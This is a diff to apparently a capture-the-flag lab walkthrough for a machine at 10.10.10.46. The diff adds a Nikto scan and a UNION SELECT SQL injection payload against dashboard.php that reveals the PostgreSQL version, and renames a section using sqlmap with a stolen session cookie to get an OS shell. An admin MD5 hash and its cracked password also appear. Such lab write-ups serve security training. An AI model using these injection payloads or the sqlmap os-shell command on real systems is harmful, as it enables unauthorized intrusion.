@@ -39,6 +39,10 @@ HOP RTT       ADDRESS
 2   244.90 ms 10.10.10.46
 </pre>
 
+## Nikto
+
+> nikto -h 10.10.10.46 | tee [nikto.log](./nikto.log)
+
 ## Install ftp
 
 > sudo apt install ftp
@@ -75,7 +79,21 @@ username: admin
 password (md5 reverse): 2cb42f8734ea607eefed3b70af13bbd3 ( qwerty789)
 </pre>
 
-## Sqlmap hack to the os shell
+## Test sql injection
+
+- At [dashboard.php](./dashboard.php)
+
+> http://10.10.10.46/dashboard.php?search='UNION SELECT NULL, NULL, NULL, NULL, VERSION() --
+
+VERSION() can replace from second to fourth parameters
+
+*first only accept integer (index) cannot be replaced*
+
+```
+PostgreSQL 11.5 (Ubuntu 11.5-1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.1.0-9ubuntu2) 9.1.0, 64-bit
+```
+
+## Sqlmap hack the os shell
 
 > sqlmap 10.10.10.46/dashboard.php?search=whatever --cookie="PHPSESSID=**"what you get on session"**" --os-shell
 
